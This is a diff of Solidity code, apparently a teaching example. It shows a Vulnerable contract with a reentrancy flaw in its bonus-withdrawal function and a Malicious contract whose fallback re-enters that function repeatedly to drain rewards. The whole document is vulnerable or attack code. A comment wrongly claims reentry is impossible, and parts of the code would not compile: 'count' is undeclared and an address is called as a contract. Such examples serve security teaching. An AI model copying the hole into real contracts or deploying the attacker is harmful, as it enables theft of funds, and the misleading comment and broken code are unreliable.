@@ -1,32 +1,57 @@
-contract Vulnerable {
-  ...
-  function getFirstBonus(address rept) {
-    require(!Bonus[rept]);
-    Reward[rept] += 100;
-    withdraw(rept);
-    Bonus[rept] = true;
+pragma solidity ^0.4.18;
+
+contract Vulnerable{
+  mapping (address => uint) private userBalances;
+  mapping (address => bool) private claimedBonus;
+  mapping (address => uint) private rewardsForA;
+
+  function InitialUser() payable{ 
+     claimedBonus[msg.sender]=true;      
+  } 
+
+  function AddToBalance() payable{ 
+     userBalances[msg.sender] += msg.value; 
+  } 
+
+  function WithdrawReward(address recipient) public {
+      uint amountToWithdraw = rewardsForA[recipient];
+      rewardsForA[recipient] = 0;
+      if (recipient.call.value(amountToWithdraw)() == false) {
+           throw;
+      }
   }
-  function withdraw(address rept) {
-    uint amount = Reward[rept];
-    Reward[rept] = 0;
-    rept.call.value(amount)();
-  }
+
+  function GetFirstWithdrawalBonus(address recipient) public {
+      if (claimedBonus[recipient] == false) {
+           throw;
+      }
+      rewardsForA[recipient] += 100;
+      WithdrawReward(recipient); 
+      //claimedBonus has been set to false, so reentry is impossible
+      claimedBonus[recipient] = false;
+   }
 }
 
+pragma solidity ^0.4.18;
+
 contract Malicious{
-  ...
-  function Malicious(){
-    vul = Vulnerable(_vulAddr);
+  address private  _owner;
+  address private  vul;
+
+ //initial the attack contract with the vulnerable address
+ function Malicious(address _vulAddr){ 
+  _owner=msg.sender;
+  vul=_vulAddr;
+ }
+ 
+ function attack(){
+  vul.GetFirstWithdrawalBonus(_owner);
+ }
+ 
+ function () payable{
+  count++;
+  if(count < 10){
+    vul.GetFirstWithdrawalBonus(_owner);
   }
-  
-  function attack(){
-    vul.getFirstBonus(_owner);
-  }
-  
-  function ()payable{
-    count++;
-    if (count < 10){
-      vul.getFirstBonus(_owner);
-    }
-  }
+ }
 }
